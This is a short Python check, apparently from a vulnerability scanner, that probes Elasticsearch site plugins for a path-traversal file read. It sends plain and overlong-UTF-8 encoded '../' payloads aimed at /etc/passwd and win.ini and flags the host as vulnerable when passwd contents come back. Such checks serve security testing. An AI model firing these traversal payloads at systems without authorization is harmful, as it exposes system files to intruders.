# coding: utf-8

import requests

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if Elasticsearch file read vul')
    pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']
    pList = ['/../../../../../../../../../../../../../../etc/passwd','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini']
    for p in pluginList:
        for path in pList:
            vulurl = "http://%s:%s/_plugin/%s%s" % (ip,str(port),p,path)
            try:
                rqu = requests.get(vulurl,timeout=5,allow_redirects=True,verify=False)
                if "/root:/" in rqu.text:
                    msg = 'There is a Elasticsearch file read vul on %s' %vulurl
                    print(msg)
                    number = 'v81'
                    return True,url,number,msg
                else:
                    pass
            except Exception as e:
                pass
    msg = 'There is no Elasticsearch file read vul'
    number = 'v0'
    return False,url,number,msg
